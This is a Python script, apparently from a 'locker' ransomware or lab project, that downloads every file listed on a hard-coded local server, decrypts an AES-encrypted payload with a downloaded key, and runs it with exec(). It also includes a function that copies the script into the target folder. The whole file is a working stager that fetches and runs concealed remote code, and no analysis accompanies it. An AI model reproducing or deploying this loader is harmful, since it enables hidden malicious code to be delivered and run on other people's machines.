#!/usr/bin/env python3

import os
import sys
import shutil
import base64
import requests
from bs4 import BeautifulSoup
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend

def download(server, target_folder):
    response = requests.get(f'http://{server}/')
    
    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        
        links = soup.find_all('a')
        
        if not os.path.exists(target_folder):
            os.makedirs(target_folder)
        
        for link in links:
            file_name = link.get('href')
            if file_name and file_name != '/':
                file_url = f'http://{server}/{file_name}'
                file_path = os.path.join(target_folder, file_name)
                file_response = requests.get(file_url)
                if file_response.status_code == 200:
                    file_path = target_folder + '/' + file_name
                    with open(file_path, 'wb') as file:
                        file.write(file_response.content)

def copy_script_to_target(target_folder):
    script_path = os.path.abspath(__file__)
    target_path = os.path.join(target_folder, os.path.basename(script_path))
    shutil.copy(script_path, target_path)
def load_from_files(key_path, enc_message_path):
    with open(key_path, 'rb') as key_file:
        key = key_file.read()
    with open(enc_message_path, 'rb') as enc_file:
        encrypted_message = enc_file.read()
    return key, encrypted_message

def decrypt_message(key, encrypted_message):
    iv = encrypted_message[:16]
    ciphertext = encrypted_message[16:]

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())

    decryptor = cipher.decryptor()
    padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    unpadder = sym_padding.PKCS7(algorithms.AES.block_size).unpadder()
    plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()

    return plaintext


if __name__ == "__main__":
    server = "192.168.100.233"
    target_folder = "/home/grimaldi/Bash/locker/lockerpy/payloads/linux2"

    if os.path.exists(target_folder) is False: 
        sys.exit()

    download(server, target_folder)
    files = os.listdir(target_folder)
    files = [file for file in files if file.endswith('.bin')]

    if "key.bin" in files[0]:
        key_file_path = target_folder + '/' + files[0]
        encrypted_message_file_path = target_folder + '/' + files[1]
    else:
        key_file_path = target_folder + '/' + files[1]
        encrypted_message_file_path = target_folder + '/' + files[0]


    key, encrypted_message = load_from_files(key_file_path, encrypted_message_file_path)
    decrypted_message = decrypt_message(key, encrypted_message)

    decoded_code = decrypted_message.decode('utf-8')
    exec(decoded_code)
    print("FLAG")
